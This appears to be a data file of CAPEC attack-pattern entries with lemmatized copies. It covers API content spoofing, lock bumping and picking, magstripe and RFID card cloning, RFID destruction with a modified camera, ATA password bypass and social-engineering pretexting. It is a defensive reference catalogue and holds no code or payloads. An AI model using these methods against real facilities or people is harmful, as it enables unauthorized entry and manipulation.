CAPEC-385,Transaction or Event Tampering via Application API Manipulation,"An attacker hosts or joins an event or transaction within an application framework in order to change the content of messages or items that are being exchanged. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, substitute one item or another, spoof an existing item and conduct a false exchange, or otherwise change the amounts or identity of what is being exchanged. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system in order to change the content of various application elements. Often, items exchanged in game can be monetized via sales for coin, virtual dollars, etc. The purpose of the attack is for the attack to scam the victim by trapping the data packets involved the exchange and altering the integrity of the transfer process.",attacker host join event transaction application framework order change content message item exchange perform attack allow attacker manipulate content way produce message content look authentic contain deceptive link substitute item spoof exist item conduct false exchange change amount identity exchange technique require use specialized software allow attacker man middle communication web browser remote system order change content application element item exchange game monetize sale coin virtual dollar etc purpose attack attack scam victim trap datum packet involve exchange alter integrity transfer process
CAPEC-386,Application API Navigation Remapping,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of links/buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains links/buttons that point to an attacker controlled destination. Some applications make navigation remapping more difficult to detect because the actual HREF values of images, profile elements, and links/buttons are masked. One example would be to place an image in a user's photo gallery that when clicked upon redirected the user to an off-site location. Also, traditional web vulnerabilities (such as CSRF) can be constructed with remapped buttons or links. In some cases navigation remapping can be used for Phishing attacks or even means to artificially boost the page view, user site reputation, or click-fraud.",attacker manipulate egress ingress datum client application framework order change destination content link button display user api message perform attack allow attacker manipulate content way produce message content look authentic contain link button point attacker control destination application navigation remapping difficult detect actual href value image profile element link button mask example place image user photo gallery click redirect user site location traditional web vulnerability csrf construct remappe button link case navigation remapping phishing attack mean artificially boost page view user site reputation click fraud
CAPEC-387,Navigation Remapping To Propagate Malicious Content,"An adversary manipulates either egress or ingress data from a client within an application framework in order to change the content of messages and thereby circumvent the expected application logic.Performing this attack allows the adversary to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the adversarys' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the adversarys' intent. When the goal is to spread malware, deceptive content is created such as modified links, buttons, or images, that entice users to click on those items, all of which point to a malicious URI. The techniques require use of specialized software that allow the adversary to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system in order to change the destination of various application interface elements.",adversary manipulate egress ingress datum client application framework order change content message circumvent expect application logic perform attack allow adversary manipulate content way produce message content look authentic contain deceptive link spam like content link adversarys code general content spoofing application api employ stage different type attack vary base adversary intent goal spread malware deceptive content create modify link button image entice user click item point malicious uri technique require use specialized software allow adversary use adversary middle communication web browser remote system order change destination application interface element
CAPEC-388,Application API Button Hijacking,An attacker manipulates either egress or ingress data from a client within an application framework in order to change the destination and/or content of buttons displayed to a user within API messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that looks authentic but contains buttons that point to an attacker controlled destination.,attacker manipulate egress ingress datum client application framework order change destination content button display user api message perform attack allow attacker manipulate content way produce message content look authentic contain button point attacker control destination
CAPEC-389,Content Spoofing Via Application API Manipulation,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to use adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system.",attacker manipulate egress ingress datum client application framework order change content message perform attack allow attacker manipulate content way produce message content look authentic contain deceptive link spam like content link attacker code general content spoofing application api employ stage different type attack vary base attacker intent technique require use specialized software allow attacker use adversary middle communication web browser remote system
CAPEC-39,Manipulating Opaque Client-based Data Tokens,"In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.",circumstance application hold important datum client token cookie url datum file forth datum manipulate client server application component reinterpret datum authentication token datum store item pricing wallet information opaquely manipulate datum bear fruit attacker pattern attacker undermine assumption client token adequately protect tamper use encryption obfuscation
CAPEC-390,Bypassing Physical Security,"Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.",facility layer model physical security traditional lock electronic base card entry system couple physical alarm hardware security mechanism range use computer case cable lock rfid tag track computer asset layered approach make difficult random physical security breach unnoticed effective stop deliberate carefully plan break in avoid detection begin evade building security surveillance method bypass electronic physical lock secure entry point
CAPEC-391,Bypassing Physical Locks,"An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.",attacker use technique method bypass physical security measure building facility physical lock range traditional lock key mechanism cable lock secure laptop server lock server case device technique lock bumping lock forcing snap gun lock picking employ bypass lock gain access facility device protect stealth evidence tampering integrity lock follow attack consideration determine method employ physical lock limit complexity locking mechanism lock offer protection shock resistant foam prevent bumping lock forcing method commonly employ lock offer countermeasure
CAPEC-392,Lock Bumping,"An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.",attacker use bump key force lock building facility gain entry lock bumping use special type key tap bump cause pin lock fall temporary alignment allow lock open lock bumping allow attacker open lock have correct key standard lock secure set internal pin prevent device turn spring load driver pin push key pin correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate bump key specially construct key exploit design bump key strike firmly tap tooth transfer force tap key pin cause lock momentarily shift proper alignment mechanism open
CAPEC-393,Lock Picking,"An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).",attacker use lock picking tool technique bypass lock building facility lock picking use special set tool manipulate pin lock different set tool require type lock lock picking attack advantage non invasive perform correctly lock damage standard lock pin tumbler lock secure set internal pin prevent tumbler device turn spring load driver pin push key pin prevent rotation bolt remain lock position correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate common lock domestic lock pick standard tool torsion wrench hook pick
CAPEC-394,Using a Snap Gun Lock to Force a Lock,"An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.",attacker use snap gun know pick gun force lock building facility pick gun special type lock picking instrument work similar principle lock bumping snap gun hand hold device attach metal pick metal pick strike pin lock transfer motion key pin driver pin force lock momentary alignment standard lock secure set internal pin prevent device turn spring load driver pin push key pin correct key insert ridge key push key pin driver pin cause correct alignment allow lock cylinder rotate snap gun exploit design metal pin strike key pin force driver pin shift unlocked position unlike bump key lock pick snap gun damage lock easily leave evidence lock tamper
CAPEC-395,Bypassing Electronic Locks and Access Controls,"An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.",attacker exploit security assumption bypass electronic lock form access control attack electronic access control follow similar method utilize different tool electronic lock utilize magnetic strip card employ rfid tag embed card badge involve sophisticated protection voice print thumb print retinal biometric magnetic strip rfid technology widespread cost effective deploy easily integrate electronic security measure technology share common weakness attacker exploit gain access facility protect mechanism copy legitimate card badge generate new card reverse engineer algorithm
CAPEC-397,Cloning Magnetic Strip Cards,"An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.",attacker duplicate datum magnetic strip card swipe card magstripe gain unauthorized access physical location person private information magstripe card encode datum band iron base magnetic particle array stripe rectangular card magstripe card data format conform iso standard primary advantage magstripe technology ease encoding portability render magnetic strip card susceptible unauthorized duplication magstripe card access control attacker need obtain valid card long copy card return card location co worker desk magstripe reader writer widely available software analyze datum encode card swipe valid card trivial number duplicate function original
CAPEC-398,Magnetic Strip Card Brute Force Attacks,"An adversary analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals.Often, magnetic strip encoding methods follow a common format for a given system laid out in up to three tracks. A single card may allow access to a corporate office complex shared by multiple companies. By analyzing how the data is stored on a card, it is also possible to create valid cards via brute-force attacks.For example, a single card can grant access to a building, a floor, and a suite number. Reading and analyzing data on multiple cards, then performing a difference analysis between data encoded on three different cards, can reveal clues as to how to generate valid cards that grant access to restricted areas of a building or suites/rooms within that building. Data stored on magstripe cards is often unencrypted, therefore comparing which data changes when two or more cards are analyzed can yield results that aid in determining the structure of the card data. A trivial example would be a common system data format on a data track which binary encodes the suite number of a building that a card will open. By creating multiple cards with differing binary encoded segments it becomes possible to enter unauthorized areas or pass through checkpoints giving the electronic ID of other persons.",adversary analyze datum magnetic strip card able generate new card contain valid sequence allow unauthorized access impersonation individual magnetic strip encoding method follow common format give system lay track single card allow access corporate office complex share multiple company analyze data store card possible create valid card brute force attack example single card grant access building floor suite number read analyze datum multiple card perform difference analysis datum encode different card reveal clue generate valid card grant access restrict area building suite room building data store magstripe card unencrypted compare data change card analyze yield result aid determine structure card datum trivial example common system datum format data track binary encode suite number building card open create multiple card differ binary encode segment possible enter unauthorized area pass checkpoint give electronic id person
CAPEC-399,Cloning RFID Cards or Chips,"An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse.RFID (Radio Frequency Identification) are passive devices which consist of an integrated circuit for processing RF signals and an antenna. RFID devices are passive in that they lack an on on-board power source. The majority of RFID chips operate on either the 13.56 MHz or 135 KHz frequency. The chip is powered when a signal is received by the antenna on the chip, powering the chip long enough to send a reply message. An attacker is able to capture and analyze RFID data by either stimulating the chip to respond or being proximate to the chip when it sends a response to a remote transmitter. This allows the attacker to duplicate the signal and conduct attacks such as gaining unauthorized access to a building or impersonating a user's identification.",attacker analyze datum return rfid chip use information duplicate rfid signal respond identically target chip case rfid chip building access control employee identification marker product deliver supply chain organization embed rfid tag inside computer asset trigger alarm remove particular room zone building similar magnetic strip card rfid card susceptible duplication cloning reuse rfid radio frequency identification passive device consist integrate circuit process rf signal antenna rfid device passive lack board power source majority rfid chip operate mhz khz frequency chip power signal receive antenna chip power chip long send reply message attacker able capture analyze rfid datum stimulate chip respond proximate chip send response remote transmitter allow attacker duplicate signal conduct attack gain unauthorized access building impersonate user identification
CAPEC-4,Using Alternative IP Address Encodings,"This attack relies on the adversary using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.",attack rely adversary unexpected format represent ip address networked application expect network location information specific format fully qualified domain name fqdn url ip address ip address range location information validate variety different possible encoding format adversary use alternate format bypass application access control
CAPEC-40,Manipulating Writeable Terminal Devices,This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.,attack exploit terminal device allow write user attacker send command string target terminal device hope target user hit enter execute malicious command privilege attacker send result copy passwd known directory collect attack succeed
CAPEC-400,RFID Chip Deactivation or Destruction,"An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it.When correctly performed the RFID chip can be disabled or destroyed without visible damage or marking to whatever item or device containing the chip. Attacking the chip directly allows for the security device or method to be bypassed without directly damaging the device itself, such as an alarm system or computer system. Various methods exist for damaging or deactivating RFID tags. For example, most common RFID chips can be permanently destroyed by creating a small electromagnetic pulse near the chip itself. One method employed requires the modifying a disposable camera by disconnecting the flash bulb and soldering a copper coil to the capacitor. Firing the camera in this configuration near any RFID chip-based device creates an EMP pulse sufficient to destroy the chip without leaving evidence of tampering. So far this attack has been demonstrated to work against RFID chips in the 13.56 MHz range.",attacker use method deactivate passive rfid tag purpose render tag badge card object contain tag unresponsive rfid tag primarily access control inventory anti theft device purpose attack rfid chip disable damage chip cause damage object house correctly perform rfid chip disable destroy visible damage marking item device contain chip attack chip directly allow security device method bypass directly damage device alarm system computer system method exist damage deactivate rfid tag example common rfid chip permanently destroy create small electromagnetic pulse near chip method employ require modify disposable camera disconnect flash bulb solder copper coil capacitor fire camera configuration near rfid chip base device create emp pulse sufficient destroy chip leave evidence tampering far attack demonstrate work rfid chip mhz range
CAPEC-401,Physically Hacking Hardware,An adversary exploits a weakness in access control to gain access to currently installed hardware and precedes to implement changes or secretly replace a hardware component which undermines the system's integrity for the purpose of carrying out an attack.,adversary exploit weakness access control gain access currently instal hardware precede implement change secretly replace hardware component undermine system integrity purpose carry attack
CAPEC-402,Bypassing ATA Password Security,"An adversary exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.",adversary exploit weakness ata security drive gain access information drive contain supply proper credential ata security employ protect hard disk information unauthorized access mechanism require user type password bios allow access drive content implementation ata security accept ata command update password user having authenticate bios occur security mechanism assume user authenticate bios prior send command drive method exist exploit flaw common instal ata protect drive system lack ata security feature hot swapping drive instal new system bios reset drive password
CAPEC-406,Dumpster Diving,"An adversary cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more, including hardware devices. By collecting this information an adversary may be able to learn important facts about the person or organization that play a role in helping the adversary in their attack.",adversary case establishment search trash bin dumpster area company information accidentally discard information item useful dumpster diver devastating nature item information find medical record resume personal photo email bank statement account detail information software tech support log include hardware device collect information adversary able learn important fact person organization play role help adversary attack
CAPEC-407,Pretexting,"An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information.Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. In simple form, these attacks can be leveraged to learn information about a target. More complicated iterations may seek to solicit a target to perform some action that assists the adversary in exploiting organizational weaknesses or obtaining access to secure facilities or systems. Pretexting is not a one-size fits all solution. Good information gathering techniques can make or break a good pretext. A solid pretext is an essential part of building trust. If an adversary’s alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on.",adversary engage pretexting behavior solicit information target person manipulate target perform action serve adversary interest pretexting attack adversary create invent scenario assume identity role persuade target victim release information perform action create lie case create new identity identity manipulate receipt information pretexting impersonate people certain job role simple form attack leverage learn information target complicated iteration seek solicit target perform action assist adversary exploit organizational weakness obtain access secure facility system pretexting size fit solution good information gathering technique break good pretext solid pretext essential build trust adversary alias story identity hole lack credibility perception credibility target likely catch
CAPEC-41,Using Meta-characters in E-mail Headers to Inject Malicious Payloads,"This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.",type attack involve attacker leverage meta character email header inject improper behavior email program email software increasingly sophisticated feature rich addition email application ubiquitous connect directly web make ideal target launch propagate attack user demand new functionality email application grow like browser complex rendering plug routine email functionality include abstract user create opportunity attacker virtually email application list email header information default email header contain valuable attacker vector attacker exploit particularly behavior email client application know meta character hide user contain script enumeration probe attack user system
CAPEC-410,Information Elicitation,"An adversary engages an individual using any combination of social engineering methods for the purpose of extracting information. Accurate contextual and environmental queues, such as knowing important information about the target company or individual can greatly increase the success of the attack and the quality of information gathered. Authentic mimicry combined with detailed knowledge increases the success of elicitation attacks.",adversary engage individual combination social engineering method purpose extract information accurate contextual environmental queue know important information target company individual greatly increase success attack quality information gather authentic mimicry combine detailed knowledge increase success elicitation attack
CAPEC-412,Pretexting via Customer Service,"An adversary engages in pretexting behavior, assuming the role of someone who works for Customer Service, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. One example of a scenario such as this would be to call an individual, articulate your false affiliation with a credit card company, and then attempt to get the individual to verify their credit card number.",adversary engage pretexting behavior assume role work customer service solicit information target person manipulate target perform action serve adversary interest example scenario individual articulate false affiliation credit card company attempt individual verify credit card number
CAPEC-413,Pretexting via Tech Support,"An adversary engages in pretexting behavior, assuming the role of a tech support worker, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. An adversary who uses social engineering to impersonate a tech support worker can have devastating effects on a network. This is an effective attack vector, because it can give an adversary physical access to network computers. It only takes a matter of seconds for someone to compromise a computer with physical access. One of the best technological tools at the disposal of a social engineer, posing as a technical support person, is a USB thumb drive. These are small, easy to conceal, and can be loaded with different payloads depending on what task needs to be done. However, this form of attack does not require physical access as it can also be effectively carried out via phone or email.",adversary engage pretexting behavior assume role tech support worker solicit information target person manipulate target perform action serve adversary interest adversary use social engineering impersonate tech support worker devastating effect network effective attack vector adversary physical access network computer take matter second compromise computer physical access good technological tool disposal social engineer pose technical support person usb thumb drive small easy conceal load different payload depend task need form attack require physical access effectively carry phone email
CAPEC-414,Pretexting via Delivery Person,"An adversary engages in pretexting behavior, assuming the role of a delivery person, to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. Impersonating a delivery person is an effective attack and an easy attack since not much acting is involved. Usually the hardest part is looking the part and having all of the proper credentials, papers and ""deliveries"" in order to be able to pull it off.",adversary engage pretexting behavior assume role delivery person solicit information target person manipulate target perform action serve adversary interest impersonate delivery person effective attack easy attack acting involve usually hard look have proper credential paper delivery order able pull
CAPEC-415,Pretexting via Phone,"An adversary engages in pretexting behavior, assuming some sort of trusted role, and contacting the targeted individual or organization via phone to solicit information from target persons, or manipulate the target into performing an action that serves the adversary's interests. This is the most common social engineering attack. Some of the most commonly effective approaches are to impersonate a fellow employee, impersonate a computer technician or to target help desk personnel.",adversary engage pretexte behavior assume sort trust role contact target individual organization phone solicit information target person manipulate target perform action serve adversary interest common social engineering attack commonly effective approach impersonate fellow employee impersonate computer technician target help desk personnel
CAPEC-416,Manipulate Human Behavior,"An adversary exploits inherent human psychological predisposition to influence a targeted individual or group to solicit information or manipulate the target into performing an action that serves the adversary's interests. Many interpersonal social engineering techniques do not involve outright deception, although they can; many are subtle ways of manipulating a target to remove barriers, make the target feel comfortable, and produce an exchange in which the target is either more likely to share information directly, or let key information slip out unintentionally. A skilled adversary uses these techniques when appropriate to produce the desired outcome. Manipulation techniques vary from the overt, such as pretending to be a supervisor to a help desk, to the subtle, such as making the target feel comfortable with the adversary's speech and thought patterns.",adversary exploit inherent human psychological predisposition influence target individual group solicit information manipulate target perform action serve adversary interest interpersonal social engineering technique involve outright deception subtle way manipulate target remove barrier target feel comfortable produce exchange target likely share information directly let key information slip unintentionally skilled adversary use technique appropriate produce desire outcome manipulation technique vary overt pretend supervisor help desk subtle make target feel comfortable adversary speech thought pattern
CAPEC-417,Influence Perception,The adversary uses social engineering to exploit the target's perception of the relationship between the adversary and themselves. This goal is to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary.,adversary use social engineering exploit target perception relationship adversary goal persuade target unknowingly perform action divulge information advantageous adversary
CAPEC-418,Influence Perception of Reciprocation,"An adversary uses a social engineering techniques to produce a sense of obligation in the target to perform a certain action or concede some sensitive or key piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. There are various techniques for fostering a sense of obligation to reciprocate or concede during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily.",adversary use social engineering technique produce sense obligation target perform certain action concede sensitive key piece information obligation action feel need sort social legal moral requirement duty contract promise technique foster sense obligation reciprocate concede ordinary mode communication method compliment target follow compliment question perform correctly target volunteer key piece information involuntarily
CAPEC-42,MIME Conversion,An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.,attacker exploit weakness mime conversion routine cause buffer overflow gain control mail server machine mime system design allow different information format interpret send e mail attack point exist datum convert mime compatible format
CAPEC-420,Influence Perception of Scarcity,"The adversary leverages a perception of scarcity to persuade the target to perform an action or divulge information that is advantageous to the adversary. By conveying a perception of scarcity, or a situation of limited supply, the adversary aims to create a sense of urgency in the context of a target's decision-making process.",adversary leverage perception scarcity persuade target perform action divulge information advantageous adversary convey perception scarcity situation limited supply adversary aim create sense urgency context target decision making process
CAPEC-421,Influence Perception of Authority,"An adversary uses a social engineering technique to convey a sense of authority that motivates the target to reveal specific information or take specific action. There are various techniques for producing a sense of authority during ordinary modes of communication. One common method is impersonation. By impersonating someone with a position of power within an organization, an adversary may motivate the target individual to reveal some piece of sensitive information or perform an action that benefits the adversary.",adversary use social engineering technique convey sense authority motivate target reveal specific information specific action technique produce sense authority ordinary mode communication common method impersonation impersonate position power organization adversary motivate target individual reveal piece sensitive information perform action benefit adversary
CAPEC-422,Influence Perception of Commitment and Consistency,"An adversary uses social engineering to convince the target to do minor tasks as opposed to larger actions. After complying with a request, individuals are more likely to agree to subsequent requests that are similar in type and required effort.",adversary use social engineering convince target minor task oppose large action comply request individual likely agree subsequent request similar type require effort
CAPEC-423,Influence Perception of Liking,"The adversary influences the target's actions by building a relationship where the target has a liking to the adversary. People are more likely to be influenced by people of whom they are fond, so the adversary attempts to ingratiate themself with the target via actions, appearance, or a combination thereof.",adversary influence target action build relationship target liking adversary people likely influence people fond adversary attempt ingratiate themself target action appearance combination thereof
CAPEC-424,Influence Perception of Consensus or Social Proof,"The adversary influences the target's actions by leveraging the inherent human nature to assume behavior of others is appropriate. In situations of uncertainty, people tend to behave in ways they see others behaving. The adversary convinces the target of adopting behavior or actions that is advantageous to the adversary.",adversary influence target action leverage inherent human nature assume behavior appropriate situation uncertainty people tend behave way behave adversary convince target adopt behavior action advantageous adversary
CAPEC-425,Target Influence via Framing,"An adversary uses framing techniques to contextualize a conversation so that the target is more likely to be influenced by the adversary's point of view. Framing is information and experiences in life that alter the way we react to decisions we must make. This type of persuasive technique exploits the way people are conditioned to perceive data and its significance, while avoiding negative or avoidance responses from the target. Rather than a specific technique framing is a methodology of conversation that slowly encourages the target to adopt to the adversary's perspective. One technique of framing is to avoid the use of the word ""No"" and to contextualize responses in a manner that is positive. When performed skillfully the target is much more likely to volunteer information or perform actions favorable to the adversary.",adversary use framing technique contextualize conversation target likely influence adversary point view framing information experience life alter way react decision type persuasive technique exploit way people condition perceive datum significance avoid negative avoidance response target specific technique framing methodology conversation slowly encourage target adopt adversary perspective technique framing avoid use word contextualize response manner positive perform skillfully target likely volunteer information perform action favorable adversary
CAPEC-426,Influence via Incentives,"The adversary incites a behavior from the target by manipulating something of influence. This is commonly associated with financial, social, or ideological incentivization. Examples include monetary fraud, peer pressure, and preying on the target's morals or ethics. The most effective incentive against one target might not be as effective against another, therefore the adversary must gather information about the target's vulnerability to particular incentives.",adversary incite behavior target manipulate influence commonly associate financial social ideological incentivization example include monetary fraud peer pressure preying target moral ethic effective incentive target effective adversary gather information target vulnerability particular incentive
CAPEC-427,Influence via Psychological Principles,"The adversary shapes the target's actions or behavior by focusing on the ways human interact and learn, leveraging such elements as cognitive and social psychology. In a variety of ways, a target can be influenced to behave or perform an action through capitalizing on what scholarship and research has learned about how and why humans react to specific scenarios and cues.",adversary shape target action behavior focus way human interact learn leverage element cognitive social psychology variety way target influence behave perform action capitalize scholarship research learn human react specific scenario cue
CAPEC-428,Influence via Modes of Thinking,"The adversary tailors their communication to the language and thought patterns of the target thereby weakening barriers or reluctance to communication. This method is a way of building rapport with a target by matching their speech patterns and the primary ways or dominant senses with which they make abstractions. This technique can be used to make the target more receptive to sharing information because the adversary has adapted their communication forms to match those of the target. When skillfully employed, the target is likely to be unaware that they are being manipulated.",adversary tailor communication language thought pattern target weaken barrier reluctance communication method way build rapport target match speech pattern primary way dominant sense abstraction technique target receptive share information adversary adapt communication form match target skillfully employ target likely unaware manipulate
CAPEC-429,Target Influence via Eye Cues,The adversary gains information via non-verbal means from the target through eye movements.,adversary gain information non verbal mean target eye movement
CAPEC-43,Exploiting Multiple Input Interpretation Layers,"An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a ""layer"" of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: <parser1> --> <input validator> --> <parser2>. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.",attacker supply target software input datum contain sequence special character design bypass input validation logic exploit rely target make multiple pass input datum process layer special character pass manner attacker disguise input reject invalid conceal layer special escape character strip subsequent processing step goal discover case input validation layer execute parsing layer user input following logic application input validator case attacker need provide input pass input validator pass convert input validator suppose stop
